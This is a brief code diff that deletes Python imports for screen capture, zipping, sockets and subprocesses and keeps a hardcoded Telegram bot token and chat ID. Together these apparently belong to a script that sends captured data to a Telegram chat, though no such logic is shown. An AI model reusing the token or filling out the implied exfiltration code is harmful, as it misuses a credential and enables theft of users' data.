@@ -1,14 +1,3 @@
-
-import os
-import socket
-import requests
-import zipfile
-from io import BytesIO
-from PIL import ImageGrab
-import datetime
-import subprocess
-import time
-
 telegram_bot_token = "6325945971:AAHwMsztDQvH_7eSN7-xnTj8D685-yVp4uc"
 chat_id = "1882056354"
 
